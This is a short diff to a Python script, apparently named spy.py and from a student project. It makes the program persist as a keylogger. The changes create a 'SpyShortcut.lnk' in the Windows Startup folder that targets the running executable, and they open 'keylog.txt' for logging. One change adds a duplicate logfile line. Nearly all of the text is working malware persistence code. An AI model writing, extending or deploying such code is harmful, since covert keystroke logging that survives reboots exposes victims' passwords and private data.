@@ -35,18 +35,18 @@ if sys.version_info[:2] < (3, 3):
 
 
 # absolute script directory path
-abs_dir = os.path.dirname(os.path.abspath(__file__))
-
 startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
-script_path = os.path.abspath(__file__)
+exe_path = sys.executable
 
 shortcut_path = os.path.join(startup_folder, 'SpyShortcut.lnk')
 shell = win32com.client.Dispatch('WScript.Shell')
 shortcut = shell.CreateShortCut(shortcut_path)
-shortcut.TargetPath = script_path #"C:/Users/mcsco/Desktop/Senior_Project/project-repository-MarcusScott483/spy.py" #maybe needs to be script_path, add .exe instead of .py ?
-shortcut.WorkingDirectory = os.path.dirname(script_path)
+shortcut.TargetPath = exe_path
+shortcut.WorkingDirectory = os.path.dirname(exe_path)
 shortcut.Save()
+
+logfile = open("keylog.txt", "w")
 
 logfile = open("keylog.txt", "w")
 
